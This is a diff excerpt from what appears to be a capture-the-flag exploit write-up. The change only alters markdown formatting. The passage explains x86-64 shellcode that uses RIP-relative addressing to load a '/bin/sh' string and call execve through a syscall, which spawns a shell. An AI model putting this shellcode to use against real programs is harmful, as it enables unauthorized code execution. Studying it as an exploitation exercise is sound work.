@@ -48,23 +48,23 @@ There are opcode bytes that does the jump for short distances, for -0x78 bytes a
 
 All registers were zeroed including $esp and $ebp ($rsp/$rbp) during the last block of execution. My tactic was to use $rip as reference for constructing since it was the only address available.
 
-#   0x7ffff7ff6000:	lea    rdi,[rip+0x19]        # Copying the address from $rip+0x19 where it contains the /bin/sh%00
+0x7ffff7ff6000:	lea    rdi,[rip+0x19]        # Copying the address from $rip+0x19 where it contains the /bin/sh%00
 
-#   0x7ffff7ff6007:	nop
+0x7ffff7ff6007:	nop
 
-#   0x7ffff7ff6008:	lea    rbx,[rdi]             # Copying the address from $rdi to $rbx
+0x7ffff7ff6008:	lea    rbx,[rdi]             # Copying the address from $rdi to $rbx
 
-#   0x7ffff7ff600b:	lea    rsp,[rdi]             # Copying the address from $rdi to $rsp
+0x7ffff7ff600b:	lea    rsp,[rdi]             # Copying the address from $rdi to $rsp
 
-#   0x7ffff7ff600e:	nop
+0x7ffff7ff600e:	nop
 
-#   0x7ffff7ff600f:	nop
+0x7ffff7ff600f:	nop
 
-#   0x7ffff7ff6010:	mov    rax,0x3b               # Setting $rax to 0x3b, execve syscall
+0x7ffff7ff6010:	mov    rax,0x3b               # Setting $rax to 0x3b, execve syscall
 
-#   0x7ffff7ff6017:	nop
+0x7ffff7ff6017:	nop
 
-#   0x7ffff7ff6018:	syscall                       # syscall
+0x7ffff7ff6018:	syscall                       # syscall
 
 And executing the exploit.
 
